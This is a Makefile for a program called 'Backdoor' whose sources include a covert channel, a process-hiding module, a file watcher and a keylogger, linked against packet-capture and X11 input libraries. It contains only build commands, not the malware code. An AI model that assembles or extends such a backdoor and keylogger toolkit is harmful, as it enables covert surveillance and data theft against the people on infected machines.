
CC          =g++
CLIB        =-std=c++11 -lpcap -lpthread -linotifytools -ltins -lboost_system -lX11 -lXi
CFLAG       =-Wall -O3
PROG_NAME   =Backdoor
SRCFILES    =src/covert_channel/utilities.cpp \
			 src/covert_channel/covert_channel.cpp \
			 src/covert_channel/backdoor_channel.cpp \
			 src/file_watcher/file_watcher.cpp \
			 src/hiding/msbuffer.c \
			 src/hiding/hiding.c \
			 src/keylogger/keylogger.cpp src/backdoor.cpp

all: $(PROG_NAME)


$(PROG_NAME): $(SRCFILES)# refork.so
	g++ $(CFLAG) -o bin/$(PROG_NAME) $(SRCFILES) $(CLIB) 

clean:
	rm -f bin/* build/*.o
